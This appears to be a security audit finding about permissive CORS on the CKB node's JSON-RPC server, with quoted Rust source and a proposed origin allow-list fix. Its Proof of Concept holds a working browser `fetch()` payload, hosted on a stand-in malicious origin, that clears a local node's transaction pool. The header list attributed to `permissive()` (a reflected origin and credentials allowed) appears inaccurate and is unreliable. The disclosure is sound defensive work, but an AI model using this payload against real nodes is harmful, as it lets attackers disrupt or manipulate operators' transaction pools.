### Title
Unconditional `CorsLayer::permissive()` on RPC HTTP/WS Server Allows Any Origin to Issue Unauthenticated RPC Calls — (`File: rpc/src/server.rs`)

---

### Summary

The CKB JSON-RPC HTTP and WebSocket server applies `CorsLayer::permissive()` unconditionally, with no configurable origin allow-list. Any web page loaded in a browser on the same machine as a running CKB node can issue cross-origin requests to the RPC endpoint (default `http://127.0.0.1:8114`) and receive full responses. Because the RPC has no authentication layer, this gives any malicious web page the same capabilities as a local RPC caller — including submitting transactions, clearing the tx-pool, and removing specific transactions.

---

### Finding Description

In `rpc/src/server.rs`, the `start_server` function builds the axum `Router` and unconditionally attaches `CorsLayer::permissive()`:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← no origin restriction
    ...
```

`CorsLayer::permissive()` from `tower-http` responds to every preflight and actual request with:

```
Access-Control-Allow-Origin: <reflected origin>
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
Access-Control-Allow-Credentials: true
```

The `RpcConfig` struct (`util/app-config/src/configs/rpc.rs`) has no `allowed_origins` or `allowed_hosts` field, so there is no mechanism for an operator to restrict which origins are permitted. The same `start_server` path is used for both the HTTP server and the WebSocket server (when `enable_websocket = true`). [1](#0-0) [2](#0-1) 

---

### Impact Explanation

The RPC exposes state-mutating methods with no authentication:

- `send_transaction` — submits a crafted transaction into the node's tx-pool and broadcasts it to peers.
- `remove_transaction` — removes a specific transaction from the pool by hash.
- `clear_tx_pool` — wipes the entire pending transaction pool.
- `send_alert` — broadcasts a signed network alert to all peers.

A malicious web page visited by a node operator can call any of these methods via a standard browser `fetch()` POST to `http://127.0.0.1:8114`. The permissive CORS response causes the browser to allow the cross-origin read, completing the request-response cycle without any user interaction beyond visiting the page. [3](#0-2) 

---

### Likelihood Explanation

The default `listen_address` is `127.0.0.1:8114`, so the RPC is reachable only from the local machine. However, browsers routinely make requests to localhost on behalf of any web page. This is a well-documented attack class (localhost CSRF / DNS rebinding). The attacker needs only to serve a web page that the node operator visits — no privileged access, no leaked keys, no Sybil attack. Node operators who run wallets, dApps, or mining dashboards in the same browser session are directly exposed. [4](#0-3) 

---

### Recommendation

Replace `CorsLayer::permissive()` with a restrictive policy. Add an `allowed_origins: Vec<String>` field to `RpcConfig`. In `start_server`, build a `CorsLayer` that only reflects origins present in that list (defaulting to an empty list, which blocks all cross-origin requests):

```rust
// util/app-config/src/configs/rpc.rs
pub allowed_origins: Vec<String>,  // e.g. ["http://localhost:3000"]

// rpc/src/server.rs
let cors = if config.allowed_origins.is_empty() {
    CorsLayer::new()  // deny all cross-origin by default
} else {
    let origins: Vec<HeaderValue> = config.allowed_origins
        .iter()
        .filter_map(|o| o.parse().ok())
        .collect();
    CorsLayer::new().allow_origin(origins)
};
app.layer(cors)
```

This mirrors the fix in the referenced report: an explicit allow-list of trusted origins replaces unconditional acceptance of any origin. [5](#0-4) [2](#0-1) 

---

### Proof of Concept

With a CKB node running at `127.0.0.1:8114`, serve the following HTML from any origin (e.g. `http://evil.example.com`):

```html
<script>
fetch("http://127.0.0.1:8114/", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    id: 1,
    jsonrpc: "2.0",
    method: "clear_tx_pool",
    params: []
  })
})
.then(r => r.json())
.then(data => console.log("RPC response:", data));
</script>
```

Because the server responds with `Access-Control-Allow-Origin: http://evil.example.com` (reflected), the browser completes the request. The tx-pool is cleared without any authentication or user confirmation. The same technique applies to `send_transaction` with an attacker-crafted transaction payload. [1](#0-0) [6](#0-5)

### Citations

**File:** rpc/src/server.rs (L97-129)
```rust
    fn start_server(
        rpc: &Arc<MetaIoHandler<Option<Session>>>,
        address: String,
        handler: Handle,
        enable_websocket: bool,
    ) -> Result<SocketAddr, AnyError> {
        let stream_config = StreamServerConfig::default()
            .with_keep_alive(true)
            .with_pipeline_size(4)
            .with_shutdown(async move {
                new_tokio_exit_rx().cancelled().await;
            });

        // HTTP and WS server.
        let post_router = post(handle_jsonrpc::<Option<Session>>);
        let get_router = if enable_websocket {
            get(handle_jsonrpc_ws::<Option<Session>>)
        } else {
            get(get_error_handler)
        };
        let method_router = post_router.merge(get_router);

        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** util/app-config/src/configs/rpc.rs (L24-61)
```rust
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize, Eq)]
#[serde(deny_unknown_fields)]
pub struct Config {
    /// RPC server listen addresses.
    pub listen_address: String,
    /// RPC TCP server listen addresses.
    ///
    /// Only TCP and WS are supported to subscribe events via the Subscription RPC module.
    #[serde(default)]
    pub tcp_listen_address: Option<String>,
    /// RPC WS server listen addresses.
    ///
    /// Only TCP and WS are supported to subscribe events via the Subscription RPC module.
    #[serde(default)]
    pub ws_listen_address: Option<String>,
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
    /// Number of RPC worker threads.
    pub threads: Option<usize>,
    /// Number of RPC batch limit.
    pub rpc_batch_limit: Option<usize>,
    /// Enabled RPC modules.
    pub modules: Vec<Module>,
    /// Rejects txs with scripts that might trigger known bugs
    #[serde(default)]
    pub reject_ill_transactions: bool,
    /// Whether enable deprecated RPC methods.
    ///
    /// Deprecated RPC methods are disabled by default.
    #[serde(default)]
    pub enable_deprecated_rpc: bool,
    /// Customized extra well known lock scripts.
    #[serde(default)]
    pub extra_well_known_lock_scripts: Vec<Script>,
    /// Customized extra well known type scripts.
    #[serde(default)]
    pub extra_well_known_type_scripts: Vec<Script>,
}
```

**File:** rpc/src/module/pool.rs (L612-635)
```rust
    fn send_transaction(
        &self,
        tx: Transaction,
        outputs_validator: Option<OutputsValidator>,
    ) -> Result<H256> {
        let tx: packed::Transaction = tx.into();
        let tx: core::TransactionView = tx.into_view();

        self.check_output_validator(outputs_validator, &tx)?;

        let tx_pool = self.shared.tx_pool_controller();
        let submit_tx = tx_pool.submit_local_tx(tx.clone());

        if let Err(e) = submit_tx {
            error!("Send submit_tx request error {}", e);
            return Err(RPCError::ckb_internal_error(e));
        }

        let tx_hash = tx.hash();
        match submit_tx.unwrap() {
            Ok(_) => Ok(tx_hash.into()),
            Err(reject) => Err(RPCError::from_submit_transaction_reject(&reject)),
        }
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```
